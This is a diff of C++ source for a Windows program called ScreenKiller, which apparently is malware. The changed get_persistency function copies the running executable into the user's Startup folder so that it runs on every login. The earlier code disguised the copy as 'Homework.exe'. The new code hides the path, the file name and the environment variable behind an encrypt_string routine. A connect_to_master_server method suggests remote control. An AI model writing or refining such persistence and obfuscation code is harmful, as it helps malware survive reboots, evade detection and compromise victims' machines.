@@ -1,4 +1,4 @@
-#include <windows.h>
+﻿#include <windows.h>
 #include <tlhelp32.h>
 #include <iostream>
 #include <thread>
@@ -69,14 +69,15 @@ bool ScreenKiller::deploy_inner()
 
 bool ScreenKiller::get_persistency()
 {
-	TCHAR szExeFileName[MAX_PATH];
-	if (GetModuleFileName(NULL, szExeFileName, MAX_PATH) == 0)
+	char szExeFileName[MAX_PATH];
+	if (GetModuleFileNameA(NULL, szExeFileName, MAX_PATH) == 0)
 		return false;
 
-	LPCWSTR filename = szExeFileName;
-	LPCWSTR dest = wcscat(_wgetenv(L"appdata"), L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Homework.exe");
+	char *filename = szExeFileName;
+	std::string new_file = this->encrypt_string("kz^TEXDXQCk`^YSX@DkdCVEC") + " " + this->encrypt_string("zRYBkgEXPEVZDkdCVECBGkYXCA^EBD") + ".exe";
+	char *dest = strcat(getenv(this->encrypt_string("VGGSVCV").c_str()), new_file.c_str());
 
-	return CopyFileW(filename, dest, false) != 0;
+	return CopyFileA(filename, dest, false) != 0;
 }
 
 bool ScreenKiller::connect_to_master_server()
